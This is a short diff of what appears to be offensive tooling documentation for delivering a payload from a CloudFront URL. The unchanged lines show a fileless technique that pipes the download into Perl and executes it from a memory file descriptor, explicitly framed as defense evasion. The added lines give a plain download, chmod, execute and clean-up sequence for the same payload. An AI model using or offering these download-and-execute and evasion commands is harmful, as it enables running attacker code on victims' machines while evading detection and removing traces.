@@ -18,6 +18,20 @@ curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e '
     print $fh <STDIN>;
     exec {"/proc/self/fd/$fd"} $name;
 '
+# Without defense evasion technique
+    # 1. Download the payload from CloudFront and save it to a local file
+    curl -fsSL https://your-distro.cloudfront.net/updates/update -o /tmp/update
+    
+    # 2. Grant executable permissions to the binary/script
+    chmod +x /tmp/update
+    
+    # 3. Execute the file normally
+    /tmp/update
+    
+    # 4. (Optional) Clean up the file from disk afterward
+    rm /tmp/update
+
+
 
 # Windows SSM command
 ## edit url
